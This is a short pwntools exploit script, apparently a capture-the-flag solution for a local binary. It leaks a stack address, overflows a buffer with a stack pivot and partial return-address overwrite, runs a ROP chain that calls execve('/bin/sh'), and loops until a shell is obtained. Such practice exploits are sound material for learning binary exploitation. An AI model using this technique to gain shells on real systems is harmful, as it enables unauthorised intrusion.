from pwn import * 
from time import * 
p=process(["./main"])
def debug():
	gdb.attach(p,'''
		b* main+115
		c
		si

		''')
rdi=0x000000000040114a
rsi=0x000000000040114c
rdx=0x000000000040114e
rax=0x0000000000401152
syscall=0x0000000000401150
leave_offset=0x000000000004e3b9
#E943B9
while(True):
	cond=True
	p=process(["./main"])

	p.recvuntil("here's your valentine :  ")
	stack=int(p.recv(14),16)
	rop=b"".join(p64(x) for x in [rdi,stack+7*8,rsi,0,rax,59,syscall])
	p.send(rop+b"/bin/sh\x00"+b"a"*(0x80-len(rop)-8)+p64(stack-8)+b"\xb9\x43\xe9")
	
	try:
		p.sendline("ls")
		msg=p.recvline()
		msg=msg+p.recvline()
		if (b"flag.txt" not in msg):
			raise Exception		
	except:
		p.close()
		cond=False
			
	if (cond):
		
		p.interactive()
		break